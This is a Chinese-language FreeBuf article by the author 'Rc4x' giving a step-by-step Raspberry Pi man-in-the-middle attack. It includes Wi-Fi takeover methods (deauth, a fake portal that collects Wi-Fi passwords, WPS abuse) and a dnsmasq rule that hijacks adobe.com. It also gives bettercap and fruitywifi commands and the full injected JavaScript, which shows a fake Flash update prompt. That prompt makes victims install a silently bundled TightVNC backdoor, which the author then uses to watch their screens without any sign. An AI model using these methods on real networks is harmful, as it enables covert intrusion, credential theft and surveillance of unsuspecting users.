***本文原创作者：Rc4x，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

## 导读  

**[上文](http://www.freebuf.com/geek/158588.html)讲解了树莓派随身工具箱的环境搭建，这段时间又对其进行了一些优化，主要是从便携美观上面改进。同时，在实际使用中发现了一些问题，并做了小小的改动。**

![001.jpg](https://image.3001.net/images/20180417/15239519743469.jpg!small)

传统的中间人攻击要用到arpspoof等敏感操作，大多数情况下会被杀毒软件拦截，同时被攻击端会出现乱码，网速卡顿甚至掉线等现象。而利用树莓派搭建物理中间人则可以有效避免以上现象。树莓派一个网卡用来接入互联网，另一个网卡作为热点，进行客户端劫持，使目标流量都经过自身。

## 前期准备

### 1.）整体思路

本次渗透测试采用诱导安装的方法，通过中间人劫持的方式在网页注入js，弹出蒙版层，诱导用户下载捆绑后门的FlashPlayer更新程序。  

劫持方法比较多，粗略的列举一下：

1，万能钥匙类软件可以解开:  

> I、获取目标路由器操作权，修改WiFi配置，树莓派伪造路由器之前的热点。
>
> II、目标路由器支持中继的话，直接修改，将其作为中继使用，上游设备为树莓派。

2、万能钥匙类软件无法连接：  

> I、发送deauth攻击，阻断客户端与目标路由器的连接，同时树莓派伪造热点，通过配置树莓派dnsmasq.config 启用no-> pool，开启webserver并配置404页面，实现客户端接入后自动弹出页面，诱导用户输入WIFI密码。
>
> II、树莓派抓取握手包，丢在淘宝十五大洋搞定。
>
> III、社工方式接触路由器，快速的按一下wps按键。

### 2.）生成后门程序

最好的后门就是那些常见的软件，永远不会被杀毒软件干掉。比如ftpserver、Sunlogin oray、VNCserver等。这里选择tight-vnc-server，小巧便捷；后门生成需要借助7-Zip SFX Maker、Resource
Hacker、Regsnap等工具的帮助。首先在本地安装完毕，然后对比注册表和文件变化，最后提取出来，精简核对后与FlashPlayer一起打包，实现后台静默安装。然后就是拿到各个环境里面测试，再针对性的进行修改。

测试完毕后将后门程序放在Apache根目录，同时在下文的js里面指定具体位置。

### 3.）配置dnsmasq劫持adobe.com指向本地

修改 /etc/dnsmasq.conf 增加  

    
    
    address=/adobe.com/10.0.0.1

然后 service dnsmasq restart重启dnsmasq使配置生效。接着service apache2 start 启动Apache  

### 4.）安装并配置软件  

    
    
    root@kali:~# apt-get install fruitywifi-module-fruityproxy
    root@kali:~# service fruitywifi start  
    

访问：http://你的树莓派地址:8000 用户名和密码都为admin  

config设置如下图：  

![29847541546706782.jpg](https://image.3001.net/images/20180419/15241094904017.jpg!small)

IN是提供AP接入点的网卡 OUT是连接上外网的网卡，可根据实际情况配置 _。_  

### 5.）实施渗透

各项准备完毕，目标设备流量已全部经过树莓派。

![1.PNG](https://image.3001.net/images/20180417/15239553796766.png!small)

首先运行bettercap对所有流经树莓派的流量进行嗅探，粗略的了解下对方网络流量情况（一些常用的命令可以事先写成脚本，方便使用）

    
    
    bettercap -I wlan1 -O log.txt -X -L -S NONE

![710859274673525087.jpg](https://image.3001.net/images/20180419/15241089672228.jpg!small)  

通过网络流量以及nmap扫描可以很快的确定对方主机的IP地址。然后在主机发生网络访问的时候开启fruitywifi Inject模块。

在 status→fruityprox edit→Inject里面写入要注入的js脚本，实现诱导下载。

    
    
    <script>(function(a){window.isMobile=false;if(/(android|ipad|playbook|silk|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))){window.isMobile=true}else{setTimeout("showDiv();",2000)}})(navigator.userAgent||navigator.vendor||window.opera);document.writeln("<div><style type=\'text/css\'>body{overflow:hidden;height:100%}.popWindow{background-color:#9D9D9D;width:100%;height:100%;left:0;top:0;filter:alpha(opacity=50);opacity:0.5;z-index:8900;position:absolute}.maskLayer{background-color:#636365;box-shadow:0 0 15px#393838;padding:10px;width:220px;line-height:30px;left:50%;top:50%;margin-left:-100px;margin-top:-100px;color:#ea8726;z-index:9000;position:absolute;text-align:center}</style><div id=\'popWindow\'class=\'popWindow\'style=\'display: none;\'></div><div id=\'maskLayer\'class=\'maskLayer\'style=\'display: none;\'><p>页面检测到您的Flash Player版本太低，请下载并安装更新！</br><a target=\'_blank\'href=\'http://get.adobe.com/flashplayer/flashplayer29_va_install.exe\'onclick=\'closeDiv()\'style=\'cursor:pointer;text-decoration: none;\'><input value=\'下载更新\'type=\'button\'></a></p></div></div>");function showDiv(){document.getElementById('popWindow').style.display='block';document.getElementById('maskLayer').style.display='block'}function closeDiv(){document.getElementById('popWindow').style.display='none';document.getElementById('maskLayer').style.display='none';document.body.style.overflow="visible"}</script>

注入的script不能有换行，所以需要提前把代码压缩一下。本机测试样式如下：

![123.gif.gif](https://image.3001.net/images/20180419/1524121361882.gif!small)  

注入完毕后脚本会自动检测当前浏览器是移动端还是pc端，如果是PC端就延迟三秒，然后弹出蒙版同时诱导下载，用户点击后，关闭蒙版，恢复对页面的操作（亦或者一直阻止对页面的操作）。手机端就什么也不做。并且由于事先在树莓派上配置好了dnsmasq
使默认dnsserver以及dhcpserver都指向树莓派，加上adobe域名的劫持，客户端看不出太大的端倪
_（下载地址是http而不是adobe默认的https，不过这已经足够骗过很多人了。）_

###  __6）.检查执行情况

每隔一段时间就对目标IP进行一次nmap扫描，当发现5900端口开放的时候，就可以确认渗透完成，此时关闭Inject模块。

附图·-安装过程：

![11111.gif](https://image.3001.net/images/20180419/15241199507996.gif!small)

后门程序和tvnserver同步安装，纵使发生意外情况，tvnserver安装失败，在flashplayer安装程序进程结束后还会进行安装情况检查，并尝试第二次安装（不安装为系统服务，使用用户模式）。

### 7.）enjoy

使用vncviewer进行连接，目标主机全程无提示，无小图标。还可以在不影响目标主机的情况下观察对方屏幕。

![2.gif](https://image.3001.net/images/20180419/15241235191021.gif!small)

嗯，不要怀疑。我在医院数据中心工作。负责维护系统的安全。

谨此，献给各位。  

***本文原创作者：Rc4x，本文属FreeBuf原创奖励计划，未经许可禁止转载**

